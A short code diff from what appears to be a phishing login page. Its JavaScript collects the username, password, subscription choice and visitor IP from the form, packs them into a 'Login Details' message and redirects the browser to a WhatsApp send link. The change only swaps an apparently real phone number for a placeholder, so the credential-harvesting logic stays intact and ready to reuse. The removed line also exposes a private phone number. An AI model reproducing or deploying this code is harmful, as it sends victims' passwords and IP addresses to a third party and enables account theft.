@@ -63,7 +63,7 @@
             let subscription = document.getElementById('subscription').value;
             let ip = await getIP();
             let message = `Login Details:\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\nSubscription: ${subscription}`;
-            let phoneNumber = "+919545689031"; // Replace with your WhatsApp number
+            let phoneNumber = "1234567890"; // Replace with your WhatsApp number
             let whatsappUrl = `https://api.whatsapp.com/send?phone=${phoneNumber}&text=${encodeURIComponent(message)}`;
             window.location.href = whatsappUrl;
         }
